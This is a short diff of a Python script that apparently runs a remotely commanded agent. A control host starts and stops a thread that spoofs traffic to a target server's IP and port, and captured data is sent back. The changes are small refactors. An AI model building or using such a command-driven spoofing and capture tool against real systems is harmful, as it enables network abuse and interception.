@@ -20,7 +20,7 @@ simulating = False
 def random_string(n=8):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
-def spoof_traffic(sock):
+def spoof_traffic():
     global simulating
     
     while True:
@@ -103,7 +103,7 @@ def main():
     sock.sendto(raw_packet, CONTROL_HOST)
 
     # simulation thread
-    sim_thread = threading.Thread(target=spoof_traffic, args=(sock,), daemon=True)
+    sim_thread = threading.Thread(target=spoof_traffic, daemon=True)
     sim_thread.start()
 
     # capture thread
@@ -119,7 +119,7 @@ def main():
         if packet_type == "start":
             simulating = True
 
-            print(f"[*] Started spoofing traffic to {SERVER_HOST}")
+            print(f"[*] Started spoofing traffic to {TARGET_SERVER_IP}:{TARGET_SERVER_PORT}")
         elif packet_type == "stop":
             simulating = False
             send_captures(sock)
